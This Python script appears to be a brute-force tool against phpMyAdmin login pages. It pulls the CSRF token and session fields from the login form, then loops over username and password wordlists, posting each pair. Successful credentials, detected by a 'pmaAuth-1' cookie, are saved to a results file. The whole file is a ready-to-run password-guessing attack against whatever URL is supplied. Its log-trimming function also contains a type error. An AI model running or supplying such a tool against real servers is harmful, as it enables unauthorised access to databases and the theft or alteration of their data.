import requests
import html
import re
import argparse
import os
def login(url, username, password):
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			return 'pmaAuth-1' in cookies
		except:
			pass
	return False

def saveFile(filepath, text):
    file = open(filepath, 'a')
    file.write(text + '\n')
    file.close()

def readFile(filepath):
	f = open(filepath, "r")
	result = re.split("[\r\n]+", f.read())
	return result

def clearfile(filepath):
	f = open(filepath, 'r+')
	lines = f.readlines()
	count = 0
	for line in lines:
		count+=1
	if count >= 100000:
		f.truncate(0)
		f.write('Checked '+ count +' password \nContinue:')
def main():
	parser = argparse.ArgumentParser(description='e.g. python %s -url http://example.com/pma/' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')

	args = parser.parse_args()
	url = args.url

	userDictionary = 'usernames.txt'
	pwdDictionary = 'passwords.txt'		

	if url is None:
		parser.print_help()
		return

	for user in readFile(userDictionary):
		for password in readFile(pwdDictionary):			 
			if login(url, user, password):
				texttrue = "[*] FOUND - %s / %s" % (user, password)
				print(texttrue)
				saveFile('Result_True.txt', texttrue) 
			else:
				textfailed = "[!] FAILED - %s / %s" % (user, password)
				print(textfailed)
				saveFile('Result_Failed.txt', textfailed)
				clearfile('Result_Failed.txt')
				
if __name__ == '__main__':
	main()